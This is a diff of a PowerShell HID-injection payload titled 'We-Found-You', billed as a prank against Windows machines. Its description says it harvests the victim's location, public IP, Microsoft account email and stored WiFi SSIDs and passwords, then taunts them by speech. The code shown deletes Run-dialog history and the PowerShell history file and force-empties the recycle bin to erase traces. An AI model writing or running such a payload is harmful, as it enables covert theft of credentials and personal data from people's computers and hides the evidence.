@@ -1,3 +1,50 @@
+############################################################################################################################################################
+#                                                                                                     
+#   Title        : We-Found-You                                                                      
+#   Author       : kyrexX                                                                             
+#   Version      : 1.0                                                                                
+#   Category     : Prank                                                                              
+#   Target       : Windows 7, 10, 11                                                                   
+#   Mode         : HID                                                                                
+#                                                                                                     
+#          ██╗  ██╗██╗   ██╗██████╗ ███████╗██╗  ██╗██╗  ██╗                                          
+#          ██║ ██╔╝╚██╗ ██╔╝██╔══██╗██╔════╝╚██╗██╔╝╚██╗██╔╝                                          
+#          █████╔╝  ╚████╔╝ ██████╔╝█████╗   ╚███╔╝  ╚███╔╝                                           
+#          ██╔═██╗   ╚██╔╝  ██╔══██╗██╔══╝   ██╔██╗  ██╔██╗                                           
+#          ██║  ██╗   ██║   ██║  ██║███████╗██╔╝ ██╗██╔╝ ██╗                                          
+#          ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝                                          
+#                                                                                                     
+#   Motto        : Curiosity first. Control later.                                                    
+#                                                                                                     
+#   Links        :                                                                                    
+#   GitHub       : github.com/kyrexX                                                                  
+#   TikTok       : tiktok.com/@kyrexX                                                                 
+#                                                                                                     
+############################################################################################################################################################
+
+<#
+.NOTES
+	The target's Location Services must be turned on or this payload will not work.
+
+.SYNOPSIS
+	This script will get the user's location and open a map of where they are in their browser and use Windows speech to declare you know where they are.  
+
+.DESCRIPTION 
+	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with their Microsoft account.
+	The SSID and WiFi password of any current or previously connected to networks.
+	It determines the last day they changed their password and how many days ago.
+	Once the information is gathered, the script will pause until a mouse movement is detected.
+	Then the script uses Sapi speak to roast their set up and lack of security.
+#>
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to get the name associated with the targets Microsoft account, if not detected UserName will be used. 
+#>
+
 function Get-fullName {
 
     try {
@@ -131,6 +178,5 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
-
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
